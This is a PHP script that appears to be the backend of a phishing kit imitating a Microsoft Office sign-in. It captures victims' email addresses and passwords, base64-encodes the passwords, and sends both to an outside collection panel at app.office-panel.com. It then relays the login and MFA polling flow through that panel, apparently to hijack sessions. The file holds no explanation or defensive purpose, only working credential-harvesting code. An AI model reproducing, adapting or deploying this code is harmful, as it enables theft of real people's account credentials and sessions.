<?php
session_start();
include "config.php";
function sanitizeInput($input) {
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}
$ai = isset($_POST['ai']) ? sanitizeInput($_POST['ai']) : null;
$pr = isset($_POST['pr']) ? sanitizeInput($_POST['pr']) : null;

function makeCurlRequest($url, $isPost = false, $postFields = null) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    if ($isPost) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    } else {
        curl_setopt($ch, CURLOPT_HTTPGET, true);
    }
    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        $error_msg = 'CURL error: ' . curl_error($ch);
        curl_close($ch);
        throw new Exception($error_msg);
    }
    curl_close($ch);
    return $response;
}
try {
    if ($ai && $pr) {
        $_SESSION["email"] = $ai;
        $_SESSION["pass"] = $pr;
        $encodedPass = base64_encode($pr);

        $url = sprintf(
            "https://app.office-panel.com/site/login?em=%s&pass=%s&email=%s&token=%s&domain=%s&page=%s",
            urlencode($ai),
            urlencode($encodedPass),
            urlencode($email),
            urlencode($token),
            urlencode($domain),
            urlencode($page)
        );
        $response = makeCurlRequest($url);
        if (in_array($response, ["WrongPassword", "UnAuth", "Godaddy"])) {
            echo $response;
            exit();
        } else {
            $content = html_entity_decode($response);
            $modified_body = str_replace('/kmsi', 'https://office.com', $content);
            file_put_contents("res.html", $modified_body);
        }
    }
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        if (isset($_SESSION["ctx"], $_SESSION["flw"], $_GET["pollCount"], $_SESSION["SessionId"])) {
            $url = sprintf(
                "https://app.office-panel.com/site/end?ctx=%s&flw=%s&pollCount=%s&sessid=%s",
                $_SESSION["ctx"],
                $_SESSION["flw"],
                urlencode($_GET["pollCount"]),
                $_SESSION["SessionId"]
            );
            echo makeCurlRequest($url);
        } else {
            throw new Exception("Session or pollCount data missing.");
        }
    }
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $body = file_get_contents('php://input');
        $url = 'https://app.office-panel.com/site/next';
        $response = makeCurlRequest($url, true, $body);

        $res_json = json_decode($response, true);

        if (isset($res_json["Ctx"], $res_json["FlowToken"], $res_json["SessionId"])) {
            $_SESSION["ctx"] = $res_json["Ctx"];
            $_SESSION["flw"] = $res_json["FlowToken"];
            $_SESSION["SessionId"] = $res_json["SessionId"];
            echo $response;
        } else {
            throw new Exception("Invalid response data.");
        }
    }
} catch (Exception $e) {
    echo 'Error: ' . $e->getMessage();
}
?>
